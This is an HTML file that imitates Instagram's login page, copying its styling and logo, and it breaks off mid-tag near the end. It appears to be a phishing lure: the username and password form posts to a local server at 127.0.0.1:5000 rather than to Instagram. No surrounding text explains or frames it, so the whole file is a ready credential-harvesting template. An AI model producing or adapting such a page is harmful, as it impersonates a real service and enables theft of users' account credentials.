<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            background-color: #fff;
            padding: 20px 40px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            text-align: center;
            width: 350px;
        }
        .login-box img {
            width: 175px;
            margin: 20px 0;
        }
        .login-box input {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 14px;
            background-color: #fafafa;
        }
        .login-box input:focus {
            outline: none;
            border-color: #a8a8a8;
        }
        .login-box button {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            margin: 10px 0;
        }
        .login-box button:hover {
            background-color: #0077c2;
        }
        .login-box .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }
        .login-box .divider .line {
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        .login-box .divider .text {
            margin: 0 10px;
            color: #8e8e8e;
            font-size: 13px;
        }
        .login-box .facebook-login {
            color: #385185;
            font-size: 14px;
            font-weight: bold;
            text-decoration: none;
            display: block;
            margin: 10px 0;
        }
        .login-box .facebook-login:hover {
            text-decoration: underline;
        }
        .login-box .forgot-password {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
            display: block;
            margin: 10px 0;
        }
        .login-box .forgot-password:hover {
            text-decoration: underline;
        }
        .login-box .signup {
            margin-top: 20px;
            font-size: 14px;
            color: #262626;
        }
        .login-box .signup a {
            color: #0095f6;
            text-decoration: none;
            font-weight: bold;
        }
        .login-box .signup a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram Logo">
        <form action="http://127.0.0.1:5000" method="post">
            <input type="text" name="username" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <div class="divider">
            <div class="line"></div>
            <div class="text">OR</div>
            <div class="line"></div>
        </div>
        <a href="#" class="facebook-login">Log in with Facebook</a>
        <a href="#" class="forgot-password">Forgot password?</a>
        <div class="signup">
            Don't have an account? <a href="#">
